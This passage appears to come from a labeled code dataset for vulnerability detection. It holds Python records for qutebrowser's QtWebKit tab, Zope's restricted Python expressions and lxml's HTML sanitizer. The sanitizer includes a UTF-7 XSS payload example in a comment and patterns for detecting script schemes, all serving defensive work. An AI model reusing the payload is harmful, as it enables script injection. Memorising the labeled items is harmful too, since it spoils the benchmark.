stream, _data, user_data = tabhistory.serialize(items)\n        qtutils.deserialize_stream(stream, self._history)\n        for i, data in enumerate(user_data):\n            self._history.itemAt(i).setUserData(data)\n        cur_data = self._history.currentItem().userData()\n        if cur_data is not None:\n            if 'zoom' in cur_data:\n                self._tab.zoom.set_factor(cur_data['zoom'])\n            if ('scroll-pos' in cur_data and\n                    self._tab.scroller.pos_px() == QPoint(0, 0)):\n                QTimer.singleShot(0, functools.partial(\n                    self._tab.scroller.to_point, cur_data['scroll-pos']))\n\n\nclass WebKitHistory(browsertab.AbstractHistory):\n\n    \"\"\"QtWebKit implementations related to page history.\"\"\"\n\n    def __init__(self, tab):\n        super().__init__(tab)\n        self.private_api = WebKitHistoryPrivate(tab)\n\n    def __len__(self):\n        return len(self._history)\n\n    def __iter__(self):\n        return iter(self._history.items())\n\n    def current_idx(self):\n        return self._history.currentItemIndex()\n\n    def can_go_back(self):\n        return self._history.canGoBack()\n\n    def can_go_forward(self):\n        return self._history.canGoForward()\n\n    def _item_at(self, i):\n        return self._history.itemAt(i)\n\n    def _go_to_item(self, item):\n        self._tab.before_load_started.emit(item.url())\n        self._history.goToItem(item)\n\n\nclass WebKitElements(browsertab.AbstractElements):\n\n    \"\"\"QtWebKit implemementations related to elements on the page.\"\"\"\n\n    def find_css(self, selector, callback, error_cb, *, only_visible=False):\n        utils.unused(error_cb)\n        mainframe = self._widget.page().mainFrame()\n        if mainframe is None:\n            raise browsertab.WebTabError(\"No frame focused!\")\n\n        elems = []\n        frames = webkitelem.get_child_frames(mainframe)\n        for f in frames:\n            for elem in f.findAllElements(selector):\n                elems.append(webkitelem.WebKitElement(elem, tab=self._tab))\n\n        if only_visible:\n            # pylint: disable=protected-access\n            elems = [e for e in elems if e._is_visible(mainframe)]\n            # pylint: enable=protected-access\n\n        callback(elems)\n\n    def find_id(self, elem_id, callback):\n        def find_id_cb(elems):\n            \"\"\"Call the real callback with the found elements.\"\"\"\n            if not elems:\n                callback(None)\n            else:\n                callback(elems[0])\n\n        # Escape non-alphanumeric characters in the selector\n        # https://www.w3.org/TR/CSS2/syndata.html#value-def-identifier\n        elem_id = re.sub(r'[^a-zA-Z0-9_-]', r'\\\\\\g<0>', elem_id)\n        self.find_css('#' + elem_id, find_id_cb, error_cb=lambda exc: None)\n\n    def find_focused(self, callback):\n        frame = self._widget.page().currentFrame()\n        if frame is None:\n            callback(None)\n            return\n\n        elem = frame.findFirstElement('*:focus')\n        if elem.isNull():\n            callback(None)\n        else:\n            callback(webkitelem.WebKitElement(elem, tab=self._tab))\n\n    def find_at_pos(self, pos, callback):\n        assert pos.x() >= 0\n        assert pos.y() >= 0\n        frame = self._widget.page().frameAt(pos)\n        if frame is None:\n            # This happens when we click inside the webview, but not actually\n            # on the QWebPage - for example when clicking the scrollbar\n            # sometimes.\n            log.webview.debug(\"Hit test at {} but frame is None!\".format(pos))\n            callback(None)\n            return\n\n        # You'd think we have to subtract frame.geometry().topLeft() from the\n        # position, but it seems QWebFrame::hitTestContent wants a position\n        # relative to the QWebView, not to the frame. This makes no sense to\n        # me, but it works this way.\n        hitresult = frame.hitTestContent(pos)\n        if hitresult.isNull():\n            # For some reason, the whole hit result can be null sometimes (e.g.\n            # on doodle menu links).\n            log.webview.debug(\"Hit test result is null!\")\n            callback(None)\n            return\n\n        try:\n            elem = webkitelem.WebKitElement(hitresult.element(), tab=self._tab)\n        except webkitelem.IsNullError:\n            # For some reason, the hit result element can be a null element\n            # sometimes (e.g. when clicking the timetable fields on\n            # http://www.sbb.ch/ ).\n            log.webview.debug(\"Hit test result element is null!\")\n            callback(None)\n            return\n\n        callback(elem)\n\n\nclass WebKitAudio(browsertab.AbstractAudio):\n\n    \"\"\"Dummy handling of audio status for QtWebKit.\"\"\"\n\n    def set_muted(self, muted: bool, override: bool = False) -> None:\n        raise browsertab.WebTabError('Muting is not supported on QtWebKit!')\n\n    def is_muted(self):\n        return False\n\n    def is_recently_audible(self):\n        return False\n\n\nclass WebKitTabPrivate(browsertab.AbstractTabPrivate):\n\n    \"\"\"QtWebKit-related methods which aren't part of the public API.\"\"\"\n\n    def networkaccessmanager(self):\n        return self._widget.page().networkAccessManager()\n\n    def user_agent(self):\n        page = self._widget.page()\n        return page.userAgentForUrl(self._tab.url())\n\n    def clear_ssl_errors(self):\n        self.networkaccessmanager().clear_all_ssl_errors()\n\n    def event_target(self):\n        return self._widget\n\n    def shutdown(self):\n        self._widget.shutdown()\n\n\nclass WebKitTab(browsertab.AbstractTab):\n\n    \"\"\"A QtWebKit tab in the browser.\"\"\"\n\n    def __init__(self, *, win_id, mode_manager, private, parent=None):\n        super().__init__(win_id=win_id, private=private, parent=parent)\n        widget = webview.WebView(win_id=win_id, tab_id=self.tab_id,\n                                 private=private, tab=self)\n        if private:\n            self._make_private(widget)\n        self.history = WebKitHistory(tab=self)\n        self.scroller = WebKitScroller(tab=self, parent=self)\n        self.caret = WebKitCaret(mode_manager=mode_manager,\n                                 tab=self, parent=self)\n        self.zoom = WebKitZoom(tab=self, parent=self)\n        self.search = WebKitSearch(tab=self, parent=self)\n        self.printing = WebKitPrinting(tab=self)\n        self.elements = WebKitElements(tab=self)\n        self.action = WebKitAction(tab=self)\n        self.audio = WebKitAudio(tab=self, parent=self)\n        self.private_api = WebKitTabPrivate(mode_manager=mode_manager,\n                                            tab=self)\n        # We're assigning settings in _set_widget\n        self.settings = webkitsettings.WebKitSettings(settings=None)\n        self._set_widget(widget)\n        self._connect_signals()\n        self.backend = usertypes.Backend.QtWebKit\n\n    def _install_event_filter(self):\n        self._widget.installEventFilter(self._mouse_event_filter)\n\n    def _make_private(self, widget):\n        settings = widget.settings()\n        settings.setAttribute(QWebSettings.PrivateBrowsingEnabled, True)\n\n    def load_url(self, url, *, emit_before_load_started=True):\n        self._load_url_prepare(\n            url, emit_before_load_started=emit_before_load_started)\n        self._widget.load(url)\n\n    def url(self, *, requested=False):\n        frame = self._widget.page().mainFrame()\n        if requested:\n            return frame.requestedUrl()\n        else:\n            return frame.url()\n\n    def dump_async(self, callback, *, plain=False):\n        frame = self._widget.page().mainFrame()\n        if plain:\n            callback(frame.toPlainText())\n        else:\n            callback(frame.toHtml())\n\n    def run_js_async(self, code, callback=None, *, world=None):\n        if world is not None and world != usertypes.JsWorld.jseval:\n            log.webview.warning(\"Ignoring world ID {}\".format(world))\n        document_element = self._widget.page().mainFrame().documentElement()\n        result = document_element.evaluateJavaScript(code)\n        if callback is not None:\n            callback(result)\n\n    def icon(self):\n        return self._widget.icon()\n\n    def reload(self, *, force=False):\n        if force:\n            action = QWebPage.ReloadAndBypassCache\n        else:\n            action = QWebPage.Reload\n        self._widget.triggerPageAction(action)\n\n    def stop(self):\n        self._widget.stop()\n\n    def title(self):\n        return self._widget.title()\n\n    @pyqtSlot()\n    def _on_history_trigger(self):\n        url = self.url()\n        requested_url = self.url(requested=True)\n        self.history_item_triggered.emit(url, requested_url, self.title())\n\n    def set_html(self, html, base_url=QUrl()):\n        self._widget.setHtml(html, base_url)\n\n    @pyqtSlot()\n    def _on_load_started(self):\n        super()._on_load_started()\n        nam = self._widget.page().networkAccessManager()\n        nam.netrc_used = False\n        # Make sure the icon is cleared when navigating to a page without one.\n        self.icon_changed.emit(QIcon())\n\n    @pyqtSlot()\n    def _on_frame_load_finished(self):\n        \"\"\"Make sure we emit an appropriate status when loading finished.\n\n        While Qt has a bool \"ok\" attribute for loadFinished, it always is True\n        when using error pages... See\n        https://github.com/qutebrowser/qutebrowser/issues/84\n        \"\"\"\n        self._on_load_finished(not self._widget.page().error_occurred)\n\n    @pyqtSlot()\n    def _on_webkit_icon_changed(self):\n        \"\"\"Emit iconChanged with a QIcon like QWebEngineView does.\"\"\"\n        if sip.isdeleted(self._widget):\n            log.webview.debug(\"Got _on_webkit_icon_changed for deleted view!\")\n            return\n        self.icon_changed.emit(self._widget.icon())\n\n    @pyqtSlot(QWebFrame)\n    def _on_frame_created(self, frame):\n        \"\"\"Connect the contentsSizeChanged signal of each frame.\"\"\"\n        # FIXME:qtwebengine those could theoretically regress:\n        # https://github.com/qutebrowser/qutebrowser/issues/152\n        # https://github.com/qutebrowser/qutebrowser/issues/263\n        frame.contentsSizeChanged.connect(self._on_contents_size_changed)\n\n    @pyqtSlot(QSize)\n    def _on_contents_size_changed(self, size):\n        self.contents_size_changed.emit(QSizeF(size))\n\n    @pyqtSlot(usertypes.NavigationRequest)\n    def _on_navigation_request(self, navigation):\n        super()._on_navigation_request(navigation)\n        if not navigation.accepted:\n            return\n\n        log.webview.debug(\"target {} override {}\".format(\n            self.data.open_target, self.data.override_target))\n\n        if self.data.override_target is not None:\n            target = self.data.override_target\n            self.data.override_target = None\n        else:\n            target = self.data.open_target\n\n        if (navigation.navigation_type == navigation.Type.link_clicked and\n                target != usertypes.ClickTarget.normal):\n            tab = shared.get_tab(self.win_id, target)\n            tab.load_url(navigation.url)\n            self.data.open_target = usertypes.ClickTarget.normal\n            navigation.accepted = False\n\n        if navigation.is_main_frame:\n            self.settings.update_for_url(navigation.url)\n\n    @pyqtSlot('QNetworkReply*')\n    def _on_ssl_errors(self, reply):\n        self._insecure_hosts.add(reply.url().host())\n\n    def _connect_signals(self):\n        view = self._widget\n        page = view.page()\n        frame = page.mainFrame()\n        page.windowCloseRequested.connect(self.window_close_requested)\n        page.linkHovered.connect(self.link_hovered)\n        page.loadProgress.connect(self._on_load_progress)\n        frame.loadStarted.connect(self._on_load_started)\n        view.scroll_pos_changed.connect(self.scroller.perc_changed)\n        view.titleChanged.connect(self.title_changed)\n        view.urlChanged.connect(self._on_url_changed)\n        view.shutting_down.connect(self.shutting_down)\n        page.networkAccessManager().sslErrors.connect(self._on_ssl_errors)\n        frame.loadFinished.connect(self._on_frame_load_finished)\n        view.iconChanged.connect(self._on_webkit_icon_changed)\n        page.frameCreated.connect(self._on_frame_created)\n        frame.contentsSizeChanged.connect(self._on_contents_size_changed)\n        frame.initialLayoutCompleted.connect(self._on_history_trigger)\n        page.navigation_request.connect(self._on_navigation_request)\n", "target": 0}
{"idx": 1050, "func": "##############################################################################\n#\n# Copyright (c) 2002 Zope Corporation and Contributors. All Rights Reserved.\n#\n# This software is subject to the provisions of the Zope Public License,\n# Version 2.1 (ZPL).  A copy of the ZPL should accompany this distribution.\n# THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY AND ALL EXPRESS OR IMPLIED\n# WARRANTIES ARE DISCLAIMED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n# WARRANTIES OF TITLE, MERCHANTABILITY, AGAINST INFRINGEMENT, AND FITNESS\n# FOR A PARTICULAR PURPOSE\n#\n##############################################################################\n\"\"\"Zope-specific Python Expression Handler\n\nHandler for Python expressions that uses the RestrictedPython package.\n\n$Id$\n\"\"\"\nfrom AccessControl import safe_builtins\nfrom AccessControl.ZopeGuards import guarded_getattr, get_safe_globals\nfrom RestrictedPython import compile_restricted_eval\nfrom zope.tales.tales import CompilerError\nfrom zope.tales.pythonexpr import PythonExpr\n\nclass PythonExpr(PythonExpr):\n    _globals = get_safe_globals()\n    _globals['_getattr_'] = guarded_getattr\n    _globals['__debug__' ] = __debug__\n\n    def __init__(self, name, expr, engine):\n        self.text = self.expr = text = expr.strip().replace('\\n', ' ')\n\n        # Unicode expression are not handled properly by RestrictedPython\n        # We convert the expression to UTF-8 (ajung)\n        if isinstance(text, unicode):\n            text = text.encode('utf-8')\n        code, err, warn, use = compile_restricted_eval(text, \n                                                       self.__class__.__name__)\n        if err:\n            raise engine.getCompilerError()('Python expression error:\\n%s' %\n                                            '\\n'.join(err))            \n        self._varnames = use.keys()\n        self._code = code\n\n    def __call__(self, econtext):\n        __traceback_info__ = self.text\n        vars = self._bind_used_names(econtext, {})\n        vars.update(self._globals)\n        return eval(self._code, vars, {})\n\nclass _SecureModuleImporter:\n    __allow_access_to_unprotected_subobjects__ = True\n\n    def __getitem__(self, module):\n        mod = safe_builtins['__import__'](module)\n        path = module.split('.')\n        for name in path[1:]:\n            mod = getattr(mod, name)\n        return mod\n\nfrom DocumentTemplate.DT_Util import TemplateDict, InstanceDict\nfrom AccessControl.DTML import RestrictedDTML\nclass Rtd(RestrictedDTML, TemplateDict):\n    this = None\n\ndef call_with_ns(f, ns, arg=1):\n    td = Rtd()\n    # prefer 'context' to 'here';  fall back to 'None'\n    this = ns.get('context', ns.get('here'))\n    td.this = this\n    request = ns.get('request', {})\n    if hasattr(request, 'taintWrapper'):\n        request = request.taintWrapper()\n    td._push(request)\n    td._push(InstanceDict(td.this, td))\n    td._push(ns)\n    try:\n        if arg==2:\n            return f(None, td)\n        else:\n            return f(td)\n    finally:\n        td._pop(3)\n", "target": 0}
{"idx": 1051, "func": "\"\"\"A cleanup tool for HTML.\n\nRemoves unwanted tags and content.  See the `Cleaner` class for\ndetails.\n\"\"\"\n\nimport re\nimport copy\ntry:\n    from urlparse import urlsplit\n    from urllib import unquote_plus\nexcept ImportError:\n    # Python 3\n    from urllib.parse import urlsplit, unquote_plus\nfrom lxml import etree\nfrom lxml.html import defs\nfrom lxml.html import fromstring, XHTML_NAMESPACE\nfrom lxml.html import xhtml_to_html, _transform_result\n\ntry:\n    unichr\nexcept NameError:\n    # Python 3\n    unichr = chr\ntry:\n    unicode\nexcept NameError:\n    # Python 3\n    unicode = str\ntry:\n    bytes\nexcept NameError:\n    # Python < 2.6\n    bytes = str\ntry:\n    basestring\nexcept NameError:\n    basestring = (str, bytes)\n\n\n__all__ = ['clean_html', 'clean', 'Cleaner', 'autolink', 'autolink_html',\n           'word_break', 'word_break_html']\n\n# Look at http://code.sixapart.com/trac/livejournal/browser/trunk/cgi-bin/cleanhtml.pl\n#   Particularly the CSS cleaning; most of the tag cleaning is integrated now\n# I have multiple kinds of schemes searched; but should schemes be\n#   whitelisted instead?\n# max height?\n# remove images?  Also in CSS?  background attribute?\n# Some way to whitelist object, iframe, etc (e.g., if you want to\n#   allow *just* embedded YouTube movies)\n# Log what was deleted and why?\n# style=\"behavior: ...\" might be bad in IE?\n# Should we have something for just <meta http-equiv>?  That's the worst of the\n#   metas.\n# UTF-7 detections?  Example:\n#     <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n#   you don't always have to have the charset set, if the page has no charset\n#   and there's UTF7-like code in it.\n# Look at these tests: http://htmlpurifier.org/live/smoketests/xssAttacks.php\n\n\n# This is an IE-specific construct you can have in a stylesheet to\n# run some Javascript:\n_css_javascript_re = re.compile(\n    r'expression\\s*\\(.*?\\)', re.S|re.I)\n\n# Do I have to worry about @\\nimport?\n_css_import_re = re.compile(\n    r'@\\s*import', re.I)\n\n# All kinds of schemes besides just javascript: that can cause\n# execution:\n_is_image_dataurl = re.compile(\n    r'^data:image/.+;base64', re.I).search\n_is_possibly_malicious_scheme = re.compile(\n    r'(?:javascript|jscript|livescript|vbscript|data|about|mocha):',\n    re.I).search\ndef _is_javascript_scheme(s):\n    if _is_image_dataurl(s):\n        return None\n    return _is_possibly_malicious_scheme(s)\n\n_substitute_whitespace = re.compile(r'[\\s\\x00-\\x08\\x0B\\x0C\\x0E-\\x19]+').sub\n# FIXME: should data: be blocked?\n\n# FIXME: check against: http://msdn2.microsoft.com/en-us/library/ms537512.aspx\n_conditional_comment_re = re.compile(\n    r'\\[if[\\s\\n\\r]+.*?][\\s\\n\\r]*>', re.I|re.S)\n\n_find_styled_elements = etree.XPath(\n    \"descendant-or-self::*[@style]\")\n\n_find_external_links = etree.XPath(\n    (\"descendant-or-self::a  [normalize-space(@href) and substring(normalize-space(@href),1,1) != '#'] |\"\n     \"descendant-or-self::x:a[normalize-space(@href) and substring(normalize-space(@href),1,1) != '#']\"),\n    namespaces={'x':XHTML_NAMESPACE})\n\n\nclass Cleaner(object):\n    \"\"\"\n    Instances cleans the document of each of the possible offending\n    elements.  The cleaning is controlled by attributes; you can\n    override attributes in a subclass, or set them in the constructor.\n\n    ``scripts``:\n        Removes any ``<script>`` tags.\n\n    ``javascript``:\n        Removes any Javascript, like an ``onclick`` attribute. Also removes stylesheets\n        as they could contain Javascript.\n\n    ``comments``:\n        Removes any comments.\n\n    ``style``:\n        Removes any style tags.\n\n    ``inline_style``\n        Removes any style attributes.  Defaults to the value of the ``style`` option.\n\n    ``links``:\n        Removes any ``<link>`` tags\n\n    ``meta``:\n        Removes any ``<meta>`` tags\n\n    ``page_structure``:\n        Structural parts of a page: ``<head>``, ``<html>``, ``<title>``.\n\n    ``processing_instructions``:\n        Removes any processing instructions.\n\n    ``embedded``:\n        Removes any embedded objects (flash, iframes)\n\n    ``frames``:\n        Removes any frame-related tags\n\n    ``forms``:\n        Removes any form tags\n\n    ``annoying_tags``:\n        Tags that aren't *wrong*, but are annoying.  ``<blink>`` and ``<marquee>``\n\n    ``remove_tags``:\n        A list of tags to remove.  Only the tags will be removed,\n        their content will get pulled up into the parent tag.\n\n    ``kill_tags``:\n        A list of tags to kill.  Killing also removes the tag's content,\n        i.e. the whole subtree, not just the tag itself.\n\n    ``allow_tags``:\n        A list of tags to include (default include all).\n\n    ``remove_unknown_tags``:\n        Remove any tags that aren't standard parts of HTML.\n\n    ``safe_attrs_only``:\n        If true, only include 'safe' attributes (specifically the list\n        from the feedparser HTML sanitisation web site).\n\n    ``safe_attrs``:\n        A set of attribute names to override the default list of attributes\n        considered 'safe' (when safe_attrs_only=True).\n\n    ``add_nofollow``:\n        If true, then any <a> tags will have ``rel=\"nofollow\"`` added to them.\n\n    ``host_whitelist``:\n        A list or set of hosts that you can use for embedded content\n        (for content like ``<object>``, ``<link rel=\"stylesheet\">``, etc).\n        You can also implement/override the method\n        ``allow_embedded_url(el, url)`` or ``allow_element(el)`` to\n        implement more complex rules for what can be embedded.\n        Anything that passes this test will be shown, regardless of\n        the value of (for instance) ``embedded``.\n\n        Note that this parameter might not work as intended if you do not\n        make the links absolute before doing the cleaning.\n\n        Note that you may also need to set ``whitelist_tags``.\n\n    ``whitelist_tags``:\n        A set of tags that can be included with ``host_whitelist``.\n        The default is ``iframe`` and ``embed``; you may wish to\n        include other tags like ``script``, or you may want to\n        implement ``allow_embedded_url`` for more control.  Set to None to\n        include all tags.\n\n    This modifies the document *in place*.\n    \"\"\"\n\n    scripts = True\n    javascript = True\n    comments = True\n    style = False\n    inline_style = None\n    links = True\n    meta = True\n    page_structure = True\n    processing_instructions = True\n    embedded = True\n    frames = True\n    forms = True\n    annoying_tags = True\n    remove_tags = None\n    allow_tags = None\n    kill_tags = None\n    remove_unknown_tags = True\n    safe_attrs_only = True\n    safe_attrs = defs.safe_attrs\n    add_nofollow = False\n    host_whitelist = ()\n    whitelist_tags = set(['iframe', 'embed'])\n\n    def __init__(self, **kw):\n        for name, value in kw.items():\n            if not hasattr(self, name):\n                raise TypeError(\n                    \"Unknown parameter: %s=%r\" % (name, value))\n            setattr(self, name, value)\n        if self.inline_style is None and 'inline_style' not in kw:\n            self.inline_style = self.style\n\n    # Used to lookup the primary URL for a given tag that is up for\n    # removal:\n    _tag_link_attrs = dict(\n        script='src',\n        link='href',\n        # From: http://java.sun.com/j2se/1.4.2/docs/guide/misc/applet.html\n        # From what I can tell, both attributes can contain a link:\n        applet=['code', 'object'],\n        iframe='src',\n        embed='src',\n        layer='src',\n        # FIXME: there doesn't really seem like a general way to figure out what\n        # links an <object> tag uses; links often go in <param> tags with values\n        # that we don't really know.  You'd have to have knowledge about specific\n        # kinds of plugins (probably keyed off classid), and match against those.\n        ##object=?,\n        # FIXME: not looking at the action currently, because it is more complex\n        # than than -- if you keep the form, you should keep the form controls.\n        ##form='action',\n        a='href',\n        )\n\n    def __call__(self, doc):\n        \"\"\"\n        Cleans the document.\n        \"\"\"\n        if hasattr(doc, 'getroot'):\n            # ElementTree instance, instead of an element\n            doc = doc.getroot()\n        # convert XHTML to HTML\n        xhtml_to_html(doc)\n        # Normalize a case that IE treats <image> like <img>, and that\n        # can confuse either this step or later steps.\n        for el in doc.iter('image'):\n            el.tag = 'img'\n        if not self.comments:\n            # Of course, if we were going to kill comments anyway, we don't\n            # need to worry about this\n            self.kill_conditional_comments(doc)\n\n        kill_tags = set(self.kill_tags or ())\n        remove_tags = set(self.remove_tags or ())\n        allow_tags = set(self.allow_tags or ())\n\n        if self.scripts:\n            kill_tags.add('script')\n        if self.safe_attrs_only:\n            safe_attrs = set(self.safe_attrs)\n            for el in doc.iter(etree.Element):\n                attrib = el.attrib\n                for aname in attrib.keys():\n                    if aname not in safe_attrs:\n                        del attrib[aname]\n        if self.javascript:\n            if not (self.safe_attrs_only and\n                    self.safe_attrs == defs.safe_attrs):\n                # safe_attrs handles events attributes itself\n                for el in doc.iter(etree.Element):\n                    attrib = el.attrib\n                    for aname in attrib.keys():\n                        if aname.startswith('on'):\n                            del attrib[aname]\n            doc.rewrite_links(self._remove_javascript_link,\n                              resolve_base_href=False)\n            # If we're deleting style then we don't have to remove JS links\n            # from styles, otherwise...\n            if not self.inline_style:\n                for el in _find_styled_elements(doc):\n                    old = el.get('style')\n                    new = _css_javascript_re.sub('', old)\n                    new = _css_import_re.sub('', new)\n                    if self._has_sneaky_javascript(new):\n                        # Something tricky is going on...\n                        del el.attrib['style']\n                    elif new != old:\n                        el.set('style', new)\n            if not self.style:\n                for el in list(doc.iter('style')):\n                    if el.get('type', '').lower().strip() == 'text/javascript':\n                        el.drop_tree()\n                        continue\n                    old = el.text or ''\n                    new = _css_javascript_re.sub('', old)\n                    # The imported CSS can do anything; we just can't allow:\n                    new = _css_import_re.sub('', old)\n                    if self._has_sneaky_javascript(new):\n                        # Something tricky is going on...\n                        el.text = '/* deleted */'\n                    elif new != old:\n                        el.text = new\n        if self.comments or self.processing_instructions:\n            # FIXME: why either?  I feel like there's some obscure reason\n            # because you can put PIs in comments...?  But I've already\n            # forgotten it\n            kill_tags.add(etree.Comment)\n        if self.processing_instructions:\n            kill_tags.add(etree.ProcessingInstruction)\n        if self.style:\n            kill_tags.add('style')\n        if self.inline_style:\n            etree.strip_attributes(doc, 'style')\n        if self.links:\n            kill_tags.add('link')\n        elif self.style or self.javascript:\n            # We must get rid of included stylesheets if Javascript is not\n            # allowed, as you can put Javascript in them\n            for el in list(doc.iter('link')):\n                if 'stylesheet' in el.get('rel', '').lower():\n                    # Note this kills alternate stylesheets as well\n                    if not self.allow_element(el):\n                        el.drop_tree()\n        if self.meta:\n            kill_tags.add('meta')\n        if self.page_structure:\n            remove_tags.update(('head', 'html', 'title'))\n        if self.embedded:\n            # FIXME: is <layer> really embedded?\n            # We should get rid of any <param> tags not inside <applet>;\n            # These are not really valid anyway.\n            for el in list(doc.iter('param')):\n                found_parent = False\n                parent = el.getparent()\n                while parent is not None and parent.tag not in ('applet', 'object'):\n                    parent = parent.getparent()\n                if parent is None:\n                    el.drop_tree()\n            kill_tags.update(('applet',))\n            # The alternate contents that are in an iframe are a good fallback:\n            remove_tags.update(('iframe', 'embed', 'layer', 'object', 'param'))\n        if self.frames:\n            # FIXME: ideally we should look at the frame links, but\n            # generally frames don't mix properly with an HTML\n            # fragment anyway.\n            kill_tags.update(defs.frame_tags)\n        if self.forms:\n            remove_tags.add('form')\n            kill_tags.update(('button', 'input', 'select', 'textarea'))\n        if self.annoying_tags:\n            remove_tags.update(('blink', 'marquee'))\n\n        _remove = []\n        _kill = []\n        for el in doc.iter():\n            if el.tag in kill_tags:\n                if self.allow_element(el):\n                    continue\n                _kill.append(el)\n            elif el.tag in remove_tags:\n                if self.allow_element(el):\n                    continue\n                _remove.append(el)\n\n        if _remove and _remove[0] == doc:\n            # We have to drop the parent-most tag, which we can't\n            # do.  Instead we'll rewrite it:\n            el = _remove.pop(0)\n            el.tag = 'div'\n            el.attrib.clear()\n        elif _kill and _kill[0] == doc:\n            # We have to drop the parent-most element, which we can't\n            # do.  Instead we'll clear it:\n            el = _kill.pop(0)\n            if el.tag != 'html':\n                el.tag = 'div'\n            el.clear()\n\n        _kill.reverse() # start with innermost tags\n        for el in _kill:\n            el.drop_tree()\n        for el in _remove:\n            el.drop_tag()\n\n        if self.remove_unknown_tags:\n            if allow_tags:\n                raise ValueError(\n                    \"It does not make sense to pass in both allow_tags and remove_unknown_tags\")\n            allow_tags = set(defs.tags)\n        if allow_tags:\n            bad = []\n            for el in doc.iter():\n                if el.tag not in allow_tags:\n                    bad.append(el)\n            if bad:\n                if bad[0] is doc:\n                    el = bad.pop(0)\n                    el.tag = 'div'\n                    el.attrib.clear()\n                for el in bad:\n                    el.drop_tag()\n        if self.add_nofollow:\n            for el in _find_external_links(doc):\n                if not self.allow_follow(el):\n                    rel = el.get('rel')\n                    if rel:\n                        if ('nofollow' in rel\n                                and ' nofollow ' in (' %s ' % rel)):\n                            continue\n                        rel = '%s nofollow' % rel\n                    else:\n                        rel = 'nofollow'\n                    el.set('rel', rel)\n\n    def allow_follow(self, anchor):\n        \"\"\"\n        Override to suppress rel=\"nofollow\" on some anchors.\n        \"\"\"\n        return False\n\n    def allow_element(self, el):\n        if el.tag not in self._tag_link_attrs:\n            return False\n        attr = self._tag_link_attrs[el.tag]\n        if isinstance(attr, (list, tuple)):\n            for one_attr in attr:\n                url = el.get(one_attr)\n                if not url:\n                    return False\n                if not self.allow_embedded_url(el, url):\n                    return False\n            return True\n        else:\n            url = el.get(attr)\n            if not url:\n                return False\n            return self.allow_embedded_url(el, url)\n\n    def allow_embedded_url(self, el, url):\n        if (self.whitelist_tags is not None\n            and el.tag not in self.whitelist_tags):\n            return False\n        scheme, netloc, path, query, fragment = urlsplit(url)\n        netloc = netloc.lower().split(':', 1)[0]\n        if scheme not in ('http', 'https'):\n            return False\n        if netloc in self.host_whitelist:\n            return True\n        return False\n\n    def kill_conditional_comments(self, doc):\n        \"\"\"\n        IE conditional comments basically embed HTML that the parser\n        doesn't normally see.  We can't allow anything like that, so\n        we'll kill any comments that could be conditional.\n        \"\"\"\n        bad = []\n        self._kill_elements(\n            doc, lambda el: _conditional_comment_re.search(el.text),\n            etree.Comment)                \n\n    def _kill_elements(self, doc, condition, iterate=None):\n        bad = []\n        for el in doc.iter(iterate):\n            if condition(el):\n                bad.append(el)\n        for el in bad:\n            el.drop_tree()\n\n    def _remove_javascript_link(self, link):\n        # links like \"j a v a s c r i p t:\" might be interpreted in IE\n        new = _substitute_whitespace('', unquote_plus(link))\n        if _is_javascript_scheme(new):\n            # FIXME: should this be None to delete?\n            return ''\n        return link\n\n    _substitute_comments = re.compile(r'/\\*.*?\\*/', re.S).sub\n\n    def _has_sneaky_javascript(self, style):\n        \"\"\"\n        Depending on the browser, stuff like ``e x p r e s s i o n(...)``\n        can get interpreted, or ``expre/* stuff */ssion(...)``.  This\n        checks for attempt to do stuff like this.\n\n        Typically the response will be to kill the entire style; if you\n        have just a bit of Javascript in the style another rule will catch\n        that and remove only the Javascript from the style; this catches\n        more sneaky attempts.\n        \"\"\"\n        style = self._substitute_comments('', style)\n        style = style.replace('\\\\', '')\n        style = _substitute_whitespace('', style)\n        style = style.lower()\n        if 'javascript:' in style:\n            return True\n        if 'expression(' in style:\n            return True\n        return False\n\n    def clean_html(self, html):\n        result_type = type(html)\n        if isinstance(html, basestring):\n            doc = fromstring(html)\n        else:\n            doc = copy.deepcopy(html)\n        self(doc)\n        return _transform_result(result_type, doc)\n\nclean = Cleaner()\nclean_html = clean.clean_html\n\n############################################################\n## Autolinking\n############################################################\n\n_link_regexes = [\n    re.compile(r'(?P<body>https?://(?P<host>[a-z0-9._-]+)(?:/[/\\-_.,a-z0-9%&?;=~]*)?(?:\\([/\\-_.,a-z0-9%&?;=~]*\\))?)', re.I),\n    # This is conservative, but autolinking can be a bit conservative:\n    re.compile(r'mailto:(?P<body>[a-z0-9._-]+@(?P<host>[a-z0-9_.-]+[a-z]))', re.I),\n    ]\n\n_avoid_elements = ['textarea', 'pre', 'code', 'head', 'select', 'a']\n\n_avoid_hosts = [\n    re.compile(r'^localhost', re.I),\n    re.compile(r'\\bexample\\.(?:com|org|net)$', re.I),\n    re.compile(r'^127\\.0\\.0\\.1$'),\n    ]\n\n_avoid_classes = ['nolink']\n\ndef autolink(el, link_regexes=_link_regexes,\n             avoid_elements=_avoid_elements,\n             avoid_hosts=_avoid_hosts,\n             avoid_classes=_avoid_classes):\n    \"\"\"\n    Turn any URLs into links.\n\n    It will search for links identified by the given regular\n    expressions (by default mailto and http(s) links).\n\n    It won't link text in an element in avoid_elements, or an element\n    with a class in avoid_classes.  It won't link to anything with a\n    host that matches one of the regular expressions in avoid_hosts\n    (default localhost and 127.0.0.1).\n\n    If you pass in an element, the element's tail will not be\n    substituted, only the contents of the element.\n    \"\"\"\n    if el.tag in avoid_elements:\n        return\n    class_name = el.get('class')\n    if class_name:\n        class_name = class_name.split()\n        for match_class in avoid_classes:\n            if match_class in class_name:\n                return\n    for child in list(el):\n        autolink(child, link_regexes=link_regexes,\n                 avoid_elements=avoid_elements,\n                 avoid_hosts=avoid_hosts,\n                 avoid_classes=avoid_classes)\n        if child.tail:\n            text, tail_children = _link_text(\n                child.tail, link_regexes, avoid_hosts, factory=el.makeelement)\n            if tail_children:\n                child.tail = text\n                index = el.index(child)\n                el[index+1:index+1] = tail_children\n    if el.text:\n        text, pre_children = _link_text(\n            el.text, link_regexes, avoid_hosts, factory=el.makeelement)\n        if pre_children:\n            el.text = text\n            el[:0] = pre_children\n\ndef _link_text(text, link_regexes, avoid_hosts, factory):\n    leading_text = ''\n    links = []\n    last_pos = 0\n    while 1:\n        best_match, best_pos = None, None\n        for regex in link_regexes:\n            regex_pos = last_pos\n            while 1:\n                match = regex.search(text, pos=regex_pos)\n                if match is None:\n                    break\n                host = match.group('host')\n                for 